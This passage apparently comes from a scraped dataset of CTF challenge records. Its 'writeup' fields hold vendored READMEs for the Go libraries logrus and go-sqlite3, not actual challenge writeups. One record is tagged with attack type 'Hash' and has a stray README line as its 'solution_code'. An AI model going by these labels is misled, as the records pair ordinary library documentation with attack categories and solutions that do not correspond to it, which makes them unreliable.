EDT\"}\n\n{\"level\":\"fatal\",\"msg\":\"The ice breaks!\",\"number\":100,\"omg\":true,\n\"time\":\"2014-03-10 19:57:38.562543128 -0400 EDT\"}\n```\n\nWith the default `log.SetFormatter(&log.TextFormatter{})` when a TTY is not\nattached, the output is compatible with the\n[logfmt](http://godoc.org/github.com/kr/logfmt) format:\n\n```text\ntime=\"2015-03-26T01:27:38-04:00\" level=debug msg=\"Started observing beach\" animal=walrus number=8\ntime=\"2015-03-26T01:27:38-04:00\" level=info msg=\"A group of walrus emerges from the ocean\" animal=walrus size=10\ntime=\"2015-03-26T01:27:38-04:00\" level=warning msg=\"The group's number increased tremendously!\" number=122 omg=true\ntime=\"2015-03-26T01:27:38-04:00\" level=debug msg=\"Temperature changes\" temperature=-4\ntime=\"2015-03-26T01:27:38-04:00\" level=panic msg=\"It's over 9000!\" animal=orca size=9009\ntime=\"2015-03-26T01:27:38-04:00\" level=fatal msg=\"The ice breaks!\" err=&{0x2082280c0 map[animal:orca size:9009] 2015-03-26 01:27:38.441574009 -0400 EDT panic It's over 9000!} number=100 omg=true\n```\nTo ensure this behaviour even if a TTY is attached, set your formatter as follows:\n\n```go\n\tlog.SetFormatter(&log.TextFormatter{\n\t\tDisableColors: true,\n\t\tFullTimestamp: true,\n\t})\n```\n\n#### Logging Method Name\n\nIf you wish to add the calling method as a field, instruct the logger via:\n```go\nlog.SetReportCaller(true)\n```\nThis adds the caller as 'method' like so:\n\n```json\n{\"animal\":\"penguin\",\"level\":\"fatal\",\"method\":\"github.com/sirupsen/arcticcreatures.migrate\",\"msg\":\"a penguin swims by\",\n\"time\":\"2014-03-10 19:57:38.562543129 -0400 EDT\"}\n```\n\n```text\ntime=\"2015-03-26T01:27:38-04:00\" level=fatal method=github.com/sirupsen/arcticcreatures.migrate msg=\"a penguin swims by\" animal=penguin\n```\nNote that this does add measurable overhead - the cost will depend on the version of Go, but is\nbetween 20 and 40% in recent tests with 1.6 and 1.7.  You can validate this in your\nenvir", "solution_code": "", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_mongodb2\\private\\private\\manager\\vendor\\github.com\\sirupsen\\logrus\\README.md", "file_size": 19382, "scraped_at": "2025-10-26T18:20:51.440828"}
{"id": "justcatthefish_justctf-2023_Description", "team": "justcatthefish", "repo": "justctf-2023", "challenge_name": "Description", "attack_type": "Hash", "writeup": "go-sqlite3\n==========\n\n[![Go Reference](https://pkg.go.dev/badge/github.com/mattn/go-sqlite3.svg)](https://pkg.go.dev/github.com/mattn/go-sqlite3)\n[![GitHub Actions](https://github.com/mattn/go-sqlite3/workflows/Go/badge.svg)](https://github.com/mattn/go-sqlite3/actions?query=workflow%3AGo)\n[![Financial Contributors on Open Collective](https://opencollective.com/mattn-go-sqlite3/all/badge.svg?label=financial+contributors)](https://opencollective.com/mattn-go-sqlite3) \n[![codecov](https://codecov.io/gh/mattn/go-sqlite3/branch/master/graph/badge.svg)](https://codecov.io/gh/mattn/go-sqlite3)\n[![Go Report Card](https://goreportcard.com/badge/github.com/mattn/go-sqlite3)](https://goreportcard.com/report/github.com/mattn/go-sqlite3)\n\nLatest stable version is v1.14 or later, not v2.\n\n~~**NOTE:** The increase to v2 was an accident. There were no major changes or features.~~\n\n# Description\n\nA sqlite3 driver that conforms to the built-in database/sql interface.\n\nSupported Golang version: See [.github/workflows/go.yaml](./.github/workflows/go.yaml).\n\nThis package follows the official [Golang Release Policy](https://golang.org/doc/devel/release.html#policy).\n\n### Overview\n\n- [go-sqlite3](#go-sqlite3)\n- [Description](#description)\n    - [Overview](#overview)\n- [Installation](#installation)\n- [API Reference](#api-reference)\n- [Connection String](#connection-string)\n  - [DSN Examples](#dsn-examples)\n- [Features](#features)\n    - [Usage](#usage)\n    - [Feature / Extension List](#feature--extension-list)\n- [Compilation](#compilation)\n  - [Android](#android)\n- [ARM](#arm)\n- [Cross Compile](#cross-compile)\n- [Google Cloud Platform](#google-cloud-platform)\n  - [Linux](#linux)\n    - [Alpine](#alpine)\n    - [Fedora](#fedora)\n    - [Ubuntu](#ubuntu)\n  - [Mac OSX](#mac-osx)\n  - [Windows](#windows)\n  - [Errors](#errors)\n- [User Authentication](#user-authentication)\n  - [Compile](#compile)\n  - [Usage](#usage-1)\n    - [Create protected database](#create-protected-database)\n    - [Password Encoding](#password-encoding)\n      - [Available Encoders](#available-encoders)\n    - [Restrictions](#restrictions)\n    - [Support](#support)\n    - [User Management](#user-management)\n      - [SQL](#sql)\n        - [Examples](#examples)\n      - [*SQLiteConn](#sqliteconn)\n    - [Attached database](#attached-database)\n- [Extensions](#extensions)\n  - [Spatialite](#spatialite)\n- [FAQ](#faq)\n- [License](#license)\n- [Author](#author)\n\n# Installation\n\nThis package can be installed with the `go get` command:\n\n    go get github.com/mattn/go-sqlite3\n\n_go-sqlite3_ is *cgo* package.\nIf you want to build your app using go-sqlite3, you need gcc.\nHowever, after you have built and installed _go-sqlite3_ with `go install github.com/mattn/go-sqlite3` (which requires gcc), you can build your app without relying on gcc in future.\n\n***Important: because this is a `CGO` enabled package, you are required to set the environment variable `CGO_ENABLED=1` and have a `gcc` compile present within your path.***\n\n# API Reference\n\nAPI documentation can be found [here](http://godoc.org/github.com/mattn/go-sqlite3).\n\nExamples can be found under the [examples](./_example) directory.\n\n# Connection String\n\nWhen creating a new SQLite database or connection to an existing one, with the file name additional options can be given.\nThis is also known as a DSN (Data Source Name) string.\n\nOptions are append after the filename of the SQLite database.\nThe database filename and options are separated by an `?` (Question Mark).\nOptions should be URL-encoded (see [url.QueryEscape](https://golang.org/pkg/net/url/#QueryEscape)).\n\nThis also applies when using an in-memory database instead of a file.\n\nOptions can be given using the following format: `KEYWORD=VALUE` and multiple options can be combined with the `&` ampersand.\n\nThis library supports DSN options of SQLite itself and provides additional options.\n\nBoolean values can be one of:\n* `0` `no` `false` `off`\n* `1` `yes` `true` `on`\n\n| Name | Key | Value(s) | Description |\n|------|-----|----------|-------------|\n| UA - Create | `_auth` | - | Create User Authentication, for more information see [User Authentication](#user-authentication) |\n| UA - Username | `_auth_user` | `string` | Username for User Authentication, for more information see [User Authentication](#user-authentication) |\n| UA - Password | `_auth_pass` | `string` | Password for User Authentication, for more information see [User Authentication](#user-authentication) |\n| UA - Crypt | `_auth_crypt` | <ul><li>SHA1</li><li>SSHA1</li><li>SHA256</li><li>SSHA256</li><li>SHA384</li><li>SSHA384</li><li>SHA512</li><li>SSHA512</li></ul> | Password encoder to use for User Authentication, for more information see [User Authentication](#user-authentication) |\n| UA - Salt | `_auth_salt` | `string` | Salt to use if the configure password encoder requires a salt, for User Authentication, for more information see [User Authentication](#user-authentication) |\n| Auto Vacuum | `_auto_vacuum` \\| `_vacuum` | <", "solution_code": "    Remove the download repository from your disk and try re-install with:\n", "tools": [], "file_path": "temp_repos\\justcatthefish_justctf-2023\\challenges\\web_mongodb2\\private\\private\\manager\\vendor\\github.com\\mattn\\go-sqlite3\\README.md", "file_size": 29900, "scraped_at": "2025-10-26T18:20:51.471354"}
